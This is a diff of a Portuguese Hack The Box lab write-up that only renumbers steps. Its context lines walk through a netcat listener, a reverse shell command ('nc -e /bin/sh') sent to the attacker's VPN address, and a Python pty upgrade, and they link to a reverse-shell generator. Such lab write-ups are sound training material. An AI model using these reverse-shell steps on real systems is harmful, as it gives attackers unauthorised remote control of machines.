@@ -171,7 +171,7 @@ nc: /bin/nc /bin/nc.traditional /usr/share/man/man1/nc.1.gz
 Enviar a `reverse shell` para nosso netcat
 > Dica: Esse site facilita o processo para fazer o reverse shell, vale apena dar uma olhada:  https://weibell.github.io/reverse-shell-generator/
 
-1. Primeiro é preciso deixar nosso netcat escutando em uma porta no nosso `host local`
+1- Primeiro é preciso deixar nosso netcat escutando em uma porta no nosso `host local`
 ```terminal
 $ rlwarp nc -nvlp YYYY
 ```
@@ -180,7 +180,7 @@ $ rlwarp nc -nvlp YYYY
 
 > **rlwarp** é um programa que pode ser usado junto do netcat para registrar e puxar o histórico de comandos utilizados.
 
-2. Após isso, é preciso enviar a reverse shell do `host remoto` para nosso netcat `local`
+2- Após isso, é preciso enviar a reverse shell do `host remoto` para nosso netcat `local`
 ```terminal
 command > nc -e /bin/sh 10.10.XX.XX YYYY
 ```
@@ -188,7 +188,7 @@ command > nc -e /bin/sh 10.10.XX.XX YYYY
 > XX é equivalente a seu ip na VPN do HTB. 
 Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr
 
-3. Verificar se existe python no host remoto
+3- Verificar se existe python no host remoto
 
 ```terminal
 ❯ nc -nvlp 2123
@@ -198,7 +198,8 @@ whereis python
 python: /usr/bin/python3.5 /usr/bin/python3.5m /usr/bin/python2.7 /usr/bin/python /usr/lib/python3.5 /usr/lib/python2.7 /etc/python3.5 /etc/python2.7 /etc/python /usr/local/lib/python3.5 /usr/local/lib/python2.7 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz
 ```
 
-4. Fazer o upgrade da shell
+4- Fazer o upgrade da shell
+
 ```terminal
 python3 -c "import pty; pty.spawn('/bin/bash')"
 www-data@passage:/var/www/html/CuteNews/uploads$
